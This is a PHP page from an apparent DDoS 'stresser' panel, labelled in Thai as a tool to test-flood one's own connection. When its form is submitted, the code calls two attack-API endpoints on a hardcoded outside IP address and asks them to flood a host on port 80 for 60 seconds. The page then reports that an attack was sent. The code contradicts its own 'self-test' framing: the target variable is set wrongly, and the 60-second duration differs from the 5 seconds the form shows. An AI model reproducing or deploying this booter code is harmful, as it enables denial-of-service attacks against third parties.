<?php
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$paginaname = 'เทสยิงเน็ตตัวเอง';

?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
			<?php include("@/header.php"); ?>
				

                    <div id="page-content">
            
                        <div class="row">
						
                          
						<div class="col-sm-12">
						
							<?php
        $ip = ['HTTP_X_FORWARDED_FOR'];
						if (isset($_POST['ddos']))
							{							
								function get_data($url) // Your main function to resolve
								{
									$ch = curl_init();
									$timeout = 5;
									curl_setopt($ch,CURLOPT_URL,$url);
									curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
									curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
									$data = curl_exec($ch);
									curl_close($ch);
									return $data;
								} 
								get_data('http://216.158.237.137/api.php?host='.$ip.'&port=80&time=60&method=zap');
								get_data('http://216.158.237.137/old.php?host='.$ip.'&port=80&time=60&method=zap');
								echo '<div class="alert alert-success alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button><strong>SUCCESS:</strong> Attack send to '.$ip.':80</div>';
							
							}
						?> 
 
							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								<span class="pull-right text-muted">nanikimi</span>
								<i class="fa fa-send"></i> <b>เทสยิงเน็ตตัวเอง</b>
								</div>
								
								<div class="widget-content">
									<form action="" method="POST">
								<div align="center">
                                    <div class="form-group">
                                        <div class="col-md-2"><strong>IP ของท่าน:</strong></div>
                                        <div class="col-md-7"><input type="text" name="host" value="<?php echo ''.getUserIpAddr(); ?>" class="form-control" disabled /></div>                                 
                                    </div><br>
                                    <div class="form-group">
                                        <br><div class="col-md-2"><strong>เวลา (วินาที):</strong></div>
                                        <div class="col-md-7"><input type="text" name="time" value="5" class="form-control" disabled /></div><br>
                                    </div>
									<br>
								</div>
									<center>การกด 'เริ่ม' คุณยืนยันความจริงที่ว่าคุณอาจะเน็ตดับไป 5 วิ
<br><button type="submit" name="ddos" class="btn btn-success">เริ่ม ยิง</button><br>Nanikimi.tk จะไม่รับผิดชอบ หากคุณใช้เครื่องมือนี้</center>
								</form>
									</div>
								
							</div>
						</div>
						 
						</div>
					</div>	
                     <? // NO BORRAR LOS TRES DIVS! ?>
               </div>
               </div>
             
          </div>

		<?php include("@/script.php"); ?>
    </body>
</html>